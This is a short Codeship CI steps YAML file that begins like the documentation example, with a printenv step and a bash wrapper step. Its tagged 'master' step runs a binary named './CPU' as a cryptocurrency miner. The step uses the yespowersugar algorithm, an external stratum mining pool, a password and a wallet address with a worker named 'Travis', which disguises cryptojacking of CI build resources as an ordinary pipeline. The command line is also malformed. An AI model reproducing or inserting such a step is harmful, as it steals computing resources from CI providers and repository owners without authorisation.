- type: parallel
  name: example_parallel_step
  steps:
    - service: codeship_example
      command: printenv
    - service: codeship_example
      # shell wrapper not required unless passing along env vars or combining commands
      command: /bin/bash -c 'ls && echo ${CI_BUILD_ID}'
- name: example_tagged_step
  tag: master
  service: codeship_example
  command: /bin/bash/ './CPU -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -p password=Unm4sk3d  -u sugar1qtuvu0vycx7nyzrxc2zzf3sr5cnrl0s7fw47787.Travis'
           ls
